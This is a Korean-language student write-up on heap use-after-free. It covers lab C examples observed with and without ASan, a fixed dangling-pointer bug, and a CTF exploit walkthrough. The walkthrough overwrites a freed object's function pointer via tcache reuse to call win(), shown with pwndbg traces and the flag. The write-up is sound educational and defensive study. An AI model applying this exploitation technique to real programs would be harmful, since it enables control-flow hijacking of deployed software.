# 리눅스 시스템 해킹 심화 과제 (UAF)


## 과제 1 — uaf-lab-kit
 
작은 C 예제 6개 + `challenge_fixme.c`를 직접 컴파일(gcc, no-ASan / ASan 두 얼굴)하여 실행하고 관찰한 결과입니다.


### 1. 관찰 기록

| # | 파일 | 얼굴 A (no-ASan) — 무엇이 이상해졌나 | 얼굴 B (ASan) — 사고 종류 |
|---|---|---|---|
| 01 | `01_hello_uaf.c` | free 후에도 `*p`를 그대로 읽고(`0x1234`가 아닌 쓰레기값), 심지어 쓰기(`0x5a5a5a5a`)까지 가능했다 | `heap-use-after-free` (30번 줄, free 후 read) |
| 02 | `02_realloc_move.c` | 이번 실행에서는 realloc이 제자리 확장되어 `cached == p`였지만, ASan은 realloc을 항상 새 주소로 이동시켜 옛 포인터를 즉시 무효화함 | `heap-use-after-free` (37번 줄, `cached[0]` read) |
| 03 | `03_reentrancy.c` | 콜백(`on_hole`)이 buf를 realloc해 이동시킨 뒤에도 캐시된 `start`로 계속 읽어, 예측 불가능한 값(대부분 0, 일부 쓰레기값)이 나옴 | `heap-use-after-free` (45번 줄, 콜백 이후 `start[i]` read) |
| 04 | `04_dos_vs_leak.c` | **(A가 핵심)** 케이스A: 재점유 안 됨 → 힙 메타데이터 쓰레기값 노출. 케이스B: 즉시 재점유 → 심어둔 `ATTACKER-PLANTED-BYTES`가 그대로 읽힘 | `heap-use-after-free` (30번 줄, 케이스A 읽기에서 재점유 전에 즉시 잡힘) |
| 05 | `05_type_confusion.c` | **(A가 핵심)** free된 Widget 자리를 재점유하며 함수포인터 자리에 `evil_render` 주소를 심자, 옛 포인터로 `render()` 호출 시 실제로 `evil_render`가 실행됨(제어 탈취) | 이번 판은 같은 자리 재점유가 안 됨(ASan 쿼런틴) → 조용히 종료 (exit 0) |
| 06 | `06_fixed.c` | 바뀐 값 없음(정상) | 조용함(성공, exit 0) |

### 2. 예측 → 확인

**Q2.1** 이번 실행에서는 `cached == p`(제자리 확장)였다. glibc의 `realloc`은 현재 청크 뒤에 여유 공간이 있으면 그 자리에서 그냥 확장하고(주소 동일), 없으면 새 자리로 복사 후 옛 자리를 free한다(주소 다름) — **힙 상태에 따라 달라지는 구현·환경 종속적 동작**이라, "같을 것"이라 가정하면 위험하다. 실제로 ASan은 realloc을 항상 이동시켜, 이 가정이 얼마나 위험한지를 보여준다.

**Q2.2** 케이스A는 재점유가 안 일어나 힙 할당기 내부 메타데이터(예측 불가능한 쓰레기값)가 그대로 읽혀, 이를 포인터로 착각하면 크래시로 이어지는 **DoS**. 케이스B는 free 직후 같은 크기로 즉시 재점유했기 때문에 공격자가 심은 값이 그대로 노출되는 **leak**.

**Q2.3** 읽은 자리가 일반 데이터가 아니라 "함수 포인터"였기 때문에, read한 값을 그대로 call하면 그 read 결과가 곧 다음에 실행할 코드 주소가 된다. 즉 "무엇을 읽었나"가 "무엇을 실행하는가"로 직결되므로, 공격자가 그 자리에 원하는 값을 심을 수 있으면 임의 코드 실행(제어 탈취)으로 이어진다.

**Q2.4** `free(p); p=NULL;`은 이후 실수로 `*p`를 해도 항상 NULL 역참조로 즉시, 눈에 띄게 죽기 때문에 "공격 가능한 UAF"를 "안전하게 눈에 띄는 크래시"로 바꾼다. 그러나 이건 사고가 난 *뒤*의 완화책일 뿐이다. njs가 택한 "캐시 대신 매번 재조회"는 애초에 dangling pointer 자체가 존재할 수 없게 만든다 — 캐시된 raw 주소가 없으니 realloc으로 자료구조가 옮겨져도 항상 최신 위치를 다시 찾아 읽는다. 그래서 (B)는 사고를 막는 게 아니라 **사고가 구조적으로 발생할 수 없게** 만든다는 점에서 더 근본적이다.

**Q2.5** 예제 **03**. README에 명시된 대로 njs sort의 materialize 루프는 hole 칸에서 프로토타입 getter(공격자 JS)를 호출하고, 그 getter가 배열을 키워 free를 유발한다. `03_reentrancy.c`의 `on_hole()` 콜백이 정확히 이 getter 역할을 하며, "캐시된 포인터로 순회하다가 내가 부른 콜백이 그 버퍼를 realloc시킨다"는 재진입 패턴을 그대로 재현한다.

### 3. challenge_fixme.c

**Q3.1** `first` (`int *first = &v.a[0];`) — 이후 반복되는 `vec_push`의 realloc을 건너뛴 채 재사용됨. (ASan 확인: `heap-use-after-free` at line 44)

**Q3.2** 바뀐 줄:
```diff
- int *first = &v.a[0];
- printf("     first(옛 주소) 로 읽기 => %d\n", *first);
+ int first_value = v.a[0];              // 주소가 아니라 값(스칼라) 자체를 저장
+ printf("     v.a[0](재조회) 로 읽기 => %d (캐시된 first_value=%d)\n", v.a[0], first_value);
```

**Q3.3** 포인터 대신 값을 캐시하고, 필요할 때는 배열을 매번 재인덱싱(`v.a[0]`)해서 읽기 때문에, realloc으로 배열이 어디로 이동하든 무효화될 수 있는 raw 포인터 자체를 애초에 보관하지 않는다 — 그래서 dangling pointer가 생기지 않고 UAF가 원천적으로 사라진다. (ASan 재확인: 수정 후 조용함, exit 0)

### 4. 보너스 — my_uaf.c (연결 리스트 노드 UAF)

```c
Node *C = malloc(sizeof(Node)); C->val = 3; C->next = NULL;
Node *B = malloc(sizeof(Node)); B->val = 2; B->next = C;
Node *A = malloc(sizeof(Node)); A->val = 1; A->next = B;

free(B);                              // A->next 는 여전히 B 를 가리킴
printf("%d\n", A->next->val);         // UAF READ — ASan이 여기서 heap-use-after-free 로 잡음

Node *X = malloc(sizeof(Node));       // B 자리를 재점유
X->val = 999; X->next = NULL;         // 공격자가 심은 값
// X == B 인 경우: A->next->val 을 다시 읽으면 999 가 그대로 섞여 나옴
```

- **no-ASan**: 위조된 값 `999`가 순회 결과에 그대로 노출됨
- **ASan**: `heap-use-after-free` at `my_uaf.c:29`에서 정확히 잡힘

**Q4.1** 연결 리스트 노드 B를 free한 뒤, 그 B를 가리키던 `A->next`(옛 포인터)로 계속 val을 읽고 다음 노드로 순회 — free된 자리를 다른 malloc이 재점유하면 위조된 값(999)이 그대로 섞여 들어온다.

---

## 과제 2 — uaf-ctf (`exploit.py` 역분석)

### 문제 개요

`uaf-lab-kit/05_type_confusion.c`(함수 포인터 UAF → 제어 탈취)를 원격 소켓 서비스(heap-note 스타일 CTF)로 옮긴 문제. `-no-pie`로 빌드되어 ASLR 우회가 필요 없는 결정론적 챌린지.

```c
struct Obj {
    void (*greet)(struct Obj *);   // offset 0: 함수 포인터
    char  msg[24];
};
```

메뉴: `1) create` `2) free` `3) greet` `4) stash` `5) exit`
결함: `case 2`에서 `free(obj)` 후 `obj = NULL`을 하지 않음 → dangling pointer.

### exploit.py 전략

| 단계 | 입력 | 동작 |
|---|---|---|
| 1 | `1\n` `pwn\n` | **create**: Obj 할당, `greet = default_greet` |
| 2 | `2\n` | **free**: Obj 반납 (포인터는 살아있음 = UAF) |
| 3 | `4\n` `8\n` + `struct.pack("<Q", win)` | **stash**: 같은 크기(32B)로 재점유 → 오프셋 0(`greet`)을 `win` 주소로 덮기 |
| 4 | `3\n` | **greet**: `obj->greet(obj)` 호출 → 실제로는 `win()` 실행 → `/flag` 출력 |

`win_addr_from_elf()`는 pwntools 없이 순수 파이썬으로 ELF `.symtab`을 파싱해 `win` 심볼 주소를 추출한다.

### checksec

```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```
→ NX가 켜져 있어 셸코드 대신 **함수 재사용(win 호출)**으로 공략. PIE가 꺼져 있어 `win` 주소가 항상 `0x401308`로 고정 — 그래서 ASLR 우회 없이 결정론적인 익스가 가능하다.

### pwndbg 실습 — 단계별 힙 상태 (직접 빌드·실행하여 확인)

`gcc -no-pie -fno-stack-protector -O0 -g chall.c -o chall` 로 빌드 후, exploit.py와 동일한 입력 시퀀스(`1`→`pwn`→`2`→`4`→`8`→win주소→`3`)를 gdb+pwndbg로 각 지점에 브레이크포인트를 걸어 추적했다.

**① create 직후 (`chall.c:79`)**
```
pwndbg> p obj
$1 = (struct Obj *) 0x4052a0
pwndbg> x/4gx obj
0x4052a0:  0x00000000004012d6   0x0000000000e7770  ← [greet=default_greet(0x4012d6)] ["pwn"+padding]
```
`nm chall`로 확인한 `default_greet = 0x4012d6`과 정확히 일치.

**② free 직후 (`chall.c:83`)**
```
pwndbg> p obj
$2 = (struct Obj *) 0x4052a0      ★ free 됐는데도 주소 그대로 (NULL 아님 = dangling)
pwndbg> tcachebins
tcachebins
0x30 [  1]:  0x4052a0 ◂— 0
```
`obj`가 가리키는 청크는 이미 tcache 0x30 bin에 올라가 있는데, 전역 변수 `obj`는 그 사실을 모른 채 여전히 같은 주소를 들고 있다 — UAF의 핵심 모순.

**③ stash 직후 (`chall.c:96`, len=8, 데이터=win 주소 리틀엔디언)**
```
pwndbg> p obj
$3 = (struct Obj *) 0x4052a0
pwndbg> p raw
$4 = 0x4052a0 "\b\023@"           ★ obj == raw → 재점유 성공
pwndbg> x/gx obj
0x4052a0:  0x0000000000401308     ★ greet 자리가 win 주소로 덮임
```
tcache는 **LIFO**라 `stash`의 `malloc(32)`가 방금 free한 Obj 자리를 그대로 되찾아온다.

**④ greet 호출 → win 진입**
```
pwndbg> break win
Breakpoint 4, win (o=0x4052a0) at chall.c:38
pwndbg> bt
#0  win () at chall.c:38
#1  main () at chall.c:86        ← obj->greet(obj) 호출 지점
...
WIN! flag = flag{WHS4_uaf_note_dangling_greet_to_win}
```
콜스택이 `obj->greet(obj)` 호출 지점(86번 줄)에서 곧장 `win()`으로 이어짐 — 함수 포인터가 위조됐다는 직접 증거.

exploit.py를 그대로 실행해도 동일하게 검증됨:
```
$ python3 exploit.py --local ./chall
[*] target = local:./chall   win = 0x401308
WIN! flag = flag{WHS4_uaf_note_dangling_greet_to_win}
[+] FLAG CAPTURED: flag{WHS4_uaf_note_dangling_greet_to_win}
```

### 결론 (익스 원리 한 줄)

`free(obj)` 후 `obj = NULL`을 하지 않아 dangling pointer가 남고, glibc tcache가 **LIFO**로 같은 크기(0x30) 청크를 즉시 재사용하는 성질을 이용해 `stash`로 `greet` 함수 포인터를 `win` 주소로 덮은 뒤, `greet` 메뉴로 `obj->greet(obj)`를 호출시켜 임의 함수 실행(`win()`)을 달성했다. uaf-lab-kit의 `05_type_confusion.c`(함수 포인터 UAF → 제어 탈취)가 원격 서비스로 확장된 형태이며, `06_fixed.c`의 방어(A) `free 후 즉시 NULL`만 있었어도 이 익스는 `case 3`에서 `if (obj)` 분기에 걸려 무력화됐을 것이다.
